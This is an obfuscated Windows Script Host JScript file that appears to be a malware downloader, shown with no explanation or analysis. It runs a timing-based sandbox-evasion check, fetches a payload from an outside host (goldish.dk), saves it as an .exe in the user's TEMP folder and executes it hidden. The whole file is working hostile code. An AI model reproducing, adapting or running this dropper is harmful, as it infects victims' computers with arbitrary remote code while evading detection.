var _L = false;
var _UR = "CreateObject";
var _C = function _WS() {return WScript[_UR]("WScript"+".Shell");}(), _QU = 11;
var _H = "MSXML2.XMLHTTP";
var _CB = 2123213;
var _EN = 0;
function _B(_O0){_C["Run"](_O0, _EN, _EN);};
function _U(){return _H + "";};
function _V(_CM, _X0){_EN = _EN * 1; return _CM - _X0;};
function _D0(){return _UR;};
/*@cc_on
  @if (@_win32 || @_win64)
    _L = true;
  @end
@*/
if (_L)
{
var _Y = "";
function _F(){return 22;};
var _PU = 0; var _Z = 0;
function _R()
{
var _MR = new this["Date"]();
var _XI = _MR["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _MR = new this["Date"]();
var _CW = _MR["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _MR = new this["Date"]();
var _YN = _MR["getUTCMilliseconds"]();
var _PU = "_U0";
_PU = _V(_CW, _XI);
var _Z = "_K";
_Z = _V(_YN, _CW);
_Y = "open";
return _V(_PU, _Z);
}
var _AH = false;
var _ML = false;
for (var _F0 = _EN; _F0 < _F() * 1; _F0++){if (_R() != _EN){
_AH = true; 
_Z = "31" + 11 * _PU + _Z; 
_ML = true; 
break;
}}
function _G() {return ((_AH == true) && (_AH == _ML)) ? 1 : _EN;};
if (_AH && _G() && _ML){
function _D() {return _C["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ajtwUcpo.ex" + "e";};
 _QY = _U();
 _Q = WScript[_UR](_QY);
 var _D1 = 1;
 while (_D1){
try {
	if (_D1 == 1)
	{
		_Q[_Y]("GET", "http://goldish.dk/o2pds", false);
		_Q["send"]();
		_O = "Sleep";
	}
	WScript[_O](_F() + 120); 
	if (_Q["readystate"] < 2 * 2) continue;
	_D1 = _EN;
	function _UO(_UM) {var _X = (1, 2, 3, 4, 5, _UM); return _X;};
	_J = WScript[_D0()]("ADODB.Stream");
	_QY = _J;
	_QY[_Y]();
	_QY["type"] = _UO(1);
	_QY["write"](_Q["ResponseBody"]);
	_J["position"] = _UO(_EN);
	_QY["Save" + "ToFile"](_D(), 2);
	_J["cl"+"ose"]();
	_LZ = _D();
	_B(_LZ);
} catch(_EG){};
}
}
}

